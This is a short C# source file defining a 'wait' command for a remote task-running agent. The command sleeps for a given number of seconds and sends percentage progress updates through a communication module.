﻿using Agent.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class WaitCommand : AgentCommand
    {
        public override string Name => "wait";

        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
        {
            int delay = 10;
            if (task.SplittedArgs.Length > 0)
                delay = int.Parse(task.SplittedArgs[0]);

            delay = delay * 1000;
            int chunk = delay / 100;

            int spent = 0;
            int completion = 0;
            while (spent < delay)
            {
                Thread.Sleep(chunk);
                completion++;
                spent += chunk;
                result.Info = $"Completed at {completion}%";
                commm.SendResult(result);
            }

            result.Result = $"Awaited for {delay}ms";
        }
    }
}